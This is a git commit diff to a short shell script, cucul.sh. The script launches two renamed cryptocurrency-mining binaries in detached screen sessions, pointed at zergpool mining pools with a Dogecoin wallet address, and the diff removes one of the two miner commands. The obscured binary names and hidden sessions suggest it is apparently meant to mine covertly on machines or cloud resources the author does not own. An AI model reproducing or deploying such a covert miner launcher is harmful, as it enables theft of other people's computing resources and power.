8957345cc50c86385420a357bb46e874ffdef276
broadbandmania <67984429+broadbandmania@users.noreply.github.com>
2022-02-06 22:44:13 +0700

    Update cucul.sh

--- cucul.sh
+++ cucul.sh
@@ -1,4 +1,3 @@
 echo "+++++++ Configure Mechine +++++++++"
 chmod +x leleC leleG mateni.sh
 screen -d -m ./leleG --algo ETHASH --pool ethash.mine.zergpool.com:9999 --user DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq --pass c=DOGE,mc=TSF,ID=leleG
-screen -d -m ./leleC -v -l verushash.mine.zergpool.com:3300 -u DSHdfkgcoyxHE95xsEZUxSMqnp8HXWZbEq -p c=DOGE,mc=VRSC,ID=leleC -t 1
